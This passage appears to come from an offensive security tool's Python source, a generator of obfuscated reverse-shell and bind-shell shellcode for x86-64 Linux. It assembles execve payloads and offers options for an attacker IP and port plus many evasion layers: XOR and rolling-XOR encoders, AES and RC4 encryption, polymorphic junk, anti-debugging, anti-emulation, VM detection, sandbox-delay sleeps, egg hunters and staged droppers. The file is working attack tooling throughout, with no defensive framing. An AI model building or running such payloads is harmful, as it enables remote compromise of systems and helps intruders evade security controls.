        chunk = final_exec_bytes[i : i + 8]
        chunk_int = int.from_bytes(chunk, "little")
        payload_asm += f"        mov rax, {chunk_int:#018x}\n"
        payload_asm += "        push rax\n"

    payload_asm += "        mov rdi, rsp\n"

    if obfuscate_path:
        payload_asm += f"""
        mov rcx, {exec_len}
        mov rbx, rdi
    {path_decode_loop_label}:
        xor byte ptr [rbx], {path_xor_key:#04x}
        inc rbx
        loop {path_decode_loop_label}
        """

    payload_asm += f"""
        mov rax, 59
        xor rsi, rsi
        xor rdx, rdx
        {syscall_instruction}
        """

    payload_asm += f"""
        jmp {main_code_end_label}

    {ptrace_fail_label}:
        mov rax, 60
        mov rdi, 1
        {"syscall" if not indirect_syscalls else f"call {syscall_gadget_label}"}
        syscall

    """

    if indirect_syscalls:
        try:
            syscall_ret_bytes = myasm("syscall; ret")
        except Exception as e:
            print(
                f"{RED}[-] Error assembling syscall gadget: {e}{RESET}", file=sys.stderr
            )
            raise
        payload_asm += f"""
    {syscall_gadget_label}:
        .byte {", ".join(hex(b) for b in syscall_ret_bytes)}


        """

    payload_asm += f"""
    {main_code_end_label}:
        mov rax, 60
        xor rdi, rdi
        {"syscall" if not indirect_syscalls else f"call {syscall_gadget_label}"}
        syscall
    """

    try:
        payload_bytes = myasm(payload_asm)
    except Exception as e:
        print(f"{RED}[-] Error assembling core payload: {e}{RESET}", file=sys.stderr)
        print(
            f"{RED}--- Failed ASM --- \n{payload_asm}\n--- END ---{RESET}",
            file=sys.stderr,
        )
        raise

    if junk:
        print(
            f"{YELLOW}[*] Inserting polymorphic junk code...{RESET}",
            file=sys.stderr,
        )
        junk_bytes = generate_polymorphic_junk()
        payload_bytes = junk_bytes + payload_bytes

    if extra_bytes:
        payload_bytes = extra_bytes + payload_bytes

    if base64_enc:
        payload_bytes = base64_encode(payload_bytes)

    if base32_enc:
        payload_bytes = base32_encode(payload_bytes)

    if aes_key:
        payload_bytes = aes_encrypt(payload_bytes, aes_key)

    if rc4_key:
        payload_bytes = rc4_encrypt(payload_bytes, rc4_key)

    return payload_bytes


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Ultimate Obfuscated Reverse Shell Shellcode Generator",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )

    conn_group = parser.add_argument_group("Connection Arguments")
    conn_group.add_argument("--ip", help="Attacker IP Address")
    conn_group.add_argument("--port", type=int, help="Attacker listener port")
    conn_group.add_argument(
        "-e", "--executable", default="/bin/sh", help="Executable path for execve"
    )
    conn_group.add_argument("--domain", help="Domain name for DNS resolution")
    conn_group.add_argument(
        "--bind-addr", default="0.0.0.0", help="Bind address for bind shell"
    )

    type_group = parser.add_argument_group("Payload Type")
    type_group.add_argument(
        "--reverse", action="store_true", default=True, help="Reverse shell (default)"
    )
    type_group.add_argument(
        "--bind", action="store_true", help="Bind shell instead of reverse"
    )
    type_group.add_argument("--dns", action="store_true", help="DNS resolution payload")
    type_group.add_argument(
        "--ipv6", action="store_true", help="Use IPv6 for connection"
    )

    evasion_group = parser.add_argument_group("Obfuscation & Evasion Arguments")
    evasion_group.add_argument(
        "--xor-key",
        type=lambda x: int(x, 0),
        help="Simple XOR key (0-255) for final payload obfuscation",
    )
    evasion_group.add_argument(
        "--rolling-xor-key",
        type=lambda x: int(x, 0),
        help="Apply rolling XOR encryption (key++) with the given starting key (0-255) [Decoder included]",
    )
    evasion_group.add_argument(
        "--rle",
        action="store_true",
        help="Enable RLE encoding (with self-decoder stub)",
    )
    evasion_group.add_argument(
        "--base64", action="store_true", help="Apply Base64 encoding"
    )
    evasion_group.add_argument(
        "--base32", action="store_true", help="Apply Base32 encoding"
    )
    evasion_group.add_argument(
        "--aes-key",
        type=lambda x: bytes.fromhex(x),
        help="AES encryption key (hex string, 16/24/32 bytes)",
    )
    evasion_group.add_argument(
        "--rc4-key",
        type=lambda x: bytes.fromhex(x),
        help="RC4 encryption key (hex string)",
    )
    evasion_group.add_argument(
        "--junk", action="store_true", help="Insert polymorphic junk code"
    )
    evasion_group.add_argument(
        "--obfuscate-path",
        action="store_true",
        help="XOR obfuscate the executable path string in memory (self-decoding)",
    )
    evasion_group.add_argument(
        "--indirect-syscalls",
        action="store_true",
        help="Use indirect calls to a 'syscall; ret' gadget",
    )
    evasion_group.add_argument(
        "--anti-emulation",
        action="store_true",
        help="Insert basic anti-emulation tricks (rdtsc, cpuid)",
    )
    evasion_group.add_argument(
        "--anti-debug",
        action="store_true",
        help="Add anti-debugging check (ptrace PTRACE_TRACEME)",
    )
    evasion_group.add_argument(
        "--stack-pivot",
        action="store_true",
        help="Enable simple stack pivot (sub rsp, 0x500)",
    )

    advanced_group = parser.add_argument_group("Advanced Evasion Arguments")
    advanced_group.add_argument(
        "--sleep",
        type=int,
        help="Sleep for N seconds before execution (sandbox evasion)",
    )
    advanced_group.add_argument(
        "--vm-detect", action="store_true", help="Enable VM/hypervisor detection"
    )
    advanced_group.add_argument(
        "--parent-check",
        action="store_true",
        help="Check parent process for suspicious activity",
    )
    advanced_group.add_argument(
        "--egg",
        type=lambda x: bytes.fromhex(x),
        help="Egg marker for egg hunter (4 bytes hex)",
    )
    advanced_group.add_argument(
        "--egg-hunter",
        action="store_true",
        help="Generate egg hunter instead of full payload",
    )
    advanced_group.add_argument(
        "--staged", action="store_true", help="Generate staged payload (dropper)"
    )
    advanced_group.add_argument(
        "--polymorphic",
        action="store_true",
        help="Apply enhanced polymorphic obfuscation",
    )

    args = parser.parse_args()

    if args.xor_key is not None and args.rolling_xor_key is not None:
        print(
            f"{RED}[-] Error: Cannot use both --xor-key and --rolling-xor-key at the same time.{RESET}",
            file=sys.stderr,
        )
        return 1
    if args.xor_key is not None and not (0 <= args.xor_key <= 255):
        print(
            f"{RED}[-] Error: XOR key must be between 0 and 255.{RESET}",
            file=sys.stderr,
        )
        return 1
    if args.rolling_xor_key is not None and not (0 <= args.rolling_xor_key <= 255):
        print(
            f"{RED}[-] Error: Rolling XOR key must be between 0 and 255.{RESET}",
            file=sys.stderr,
        )
        return 1
    if args.port and (args.port <= 0 or args.port > 65535):
        print(
            f"{RED}[-] Error: Port must be between 1 and 65535.{RESET}",
            file=sys.stderr,
        )
        return 1
    if not args.ip and args.port and not args.bind:
        print(
            f"{RED}[-] Error: Port provided without IP address.{RESET}",
            file=sys.stderr,
        )
        return 1

    if args.base64 and args.base32:
        print(
            f"{RED}[-] Error: Cannot use both --base64 and --base32 at the same time.{RESET}",
            file=sys.stderr,
        )
        return 1

    if args.bind and not args.port:
        print(
            f"{RED}[-] Error: --bind requires --port.{RESET}",
            file=sys.stderr,
        )
        return 1

    try:
        payload_type = "reverse"
        if args.bind:
            payload_type = "bind"
        elif args.dns:
            payload_type = "dns"

        if args.egg_hunter:
            print(f"{YELLOW}[*] Generating egg hunter...{RESET}", file=sys.stderr)
            egg_val = args.egg or b"\x00\x00\x00\x00"
            final_payload = egg_hunter(egg_val)
            print(
                f"{YELLOW}[*] Egg hunter size: {len(final_payload)} bytes{RESET}",
                file=sys.stderr,
            )
        elif args.staged:
            print(f"{YELLOW}[*] Generating staged payload...{RESET}", file=sys.stderr)
            stage1, stage2 = generate_staged_payload()
            print(
                f"{YELLOW}[*] Stage 1 size: {len(stage1)} bytes{RESET}",
                file=sys.stderr,
            )
            print(
                f"{YELLOW}[*] Stage 2 size: {len(stage2)} bytes{RESET}",
                file=sys.stderr,
            )
            print(f"\n{GREEN}[+] Stage 1 ({len(stage1)} bytes):{RESET}")
            print("".join(f"\\x{b:02x}" for b in stage1))
            print(f"\n{GREEN}[+] Stage 2 ({len(stage2)} bytes):{RESET}")
            print("".join(f"\\x{b:02x}" for b in stage2))
            return 0
        else:
            print(f"{YELLOW}[*] Generating core payload...{RESET}", file=sys.stderr)
            core_payload = generate_payload(
                args.ip,
                args.port,
                args.executable,
                args.junk,
                args.anti_emulation,
                args.stack_pivot,
                args.obfuscate_path,
                args.anti_debug,
                args.indirect_syscalls,
                payload_type=payload_type,
                ipv6=args.ipv6,
                domain=args.domain,
                bind_addr=args.bind_addr,
                sleep_seconds=args.sleep,
                vm_detect=args.vm_detect,
                parent_check=args.parent_check,
                egg=args.egg,
                base64_enc=args.base64,
                base32_enc=args.base32,
                aes_key=args.aes_key,
                rc4_key=args.rc4_key,
            )
            print(
                f"{YELLOW}[*] Core payload size: {len(core_payload)} bytes{RESET}",
                file=sys.stderr,
            )

            final_payload = core_payload
            payload_size_before_rle = len(final_payload)

            if args.rle:
                print(f"{YELLOW}[*] Applying RLE encoding...{RESET}", file=sys.stderr)
                encoded_payload = rle_encode(final_payload)
                print(
                    f"{YELLOW}[*] RLE Encoded payload size: {len(encoded_payload)} bytes{RESET}",
                    file=sys.stderr,
                )
                decoder_stub = rle_decoder_stub(payload_size_before_rle)
                print(
                    f"{YELLOW}[*] RLE Decoder stub size: {len(decoder_stub)} bytes{RESET}",
                    file=sys.stderr,
                )
                final_payload = decoder_stub + encoded_payload
                print(
                    f"{YELLOW}[*] Total size with RLE stub: {len(final_payload)} bytes{RESET}",
                    file=sys.stderr,
                )

            if args.xor_key is not None:
                print(
                    f"{YELLOW}[*] Applying simple XOR encryption with key: {args.xor_key:#04x}{RESET}",
                    file=sys.stderr,
                )
                final_payload = xor_encrypt(final_payload, args.xor_key)

            if args.rolling_xor_key is not None:
                print(
                    f"{YELLOW}[*] Applying rolling XOR encryption with starting key: {args.rolling_xor_key:#04x}{RESET}",
                    file=sys.stderr,
                )
                decoder_stub = rolling_xor_decoder_stub(
                    len(final_payload), args.rolling_xor_key
                )
                final_payload = decoder_stub + rolling_xor_encrypt(
                    final_payload, args.rolling_xor_key
                )
                print(
                    f"{YELLOW}[*] Rolling XOR decoder stub size: {len(decoder_stub)} bytes{RESET}",
                    file=sys.stderr,
                )
                print(
                    f"{YELLOW}[*] Total size with rolling XOR stub: {len(final_payload)} bytes{RESET}",
                    file=sys.stderr,
                )

            if args.polymorphic:
                print(
                    f"{YELLOW}[*] Applying enhanced polymorphic obfuscation...{RESET}",
                    file=sys.stderr,
                )
                final_payload = enhanced_polymorphic_engine(final_payload)
                print(
                    f"{YELLOW}[*] Polymorphic payload size: {len(final_payload)} bytes{RESET}",
                    file=sys.stderr,
                )

        print(f"\n{GREEN}[+] Final Shellcode ({len(final_payload)} bytes):{RESET}")
        print("".join(f"\\x{b:02x}" for b in final_payload))
        print(f"\n{YELLOW}[*] Example Usage (Python):{RESET}")
        shellcode_example = "".join(f"\\x{b:02x}" for b in final_payload)
        print(f'shellcode = b"{shellcode_example}"')

    except ValueError as e:
        print(f"\n{RED}[-] Error: {e}{RESET}", file=sys.stderr)
        return 1
    except Exception as e:
        print(
            f"\n{RED}[-] An unexpected error occurred during generation: {e}{RESET}",
            file=sys.stderr,
        )
        import traceback

        traceback.print_exc()
        return 1

    return 0
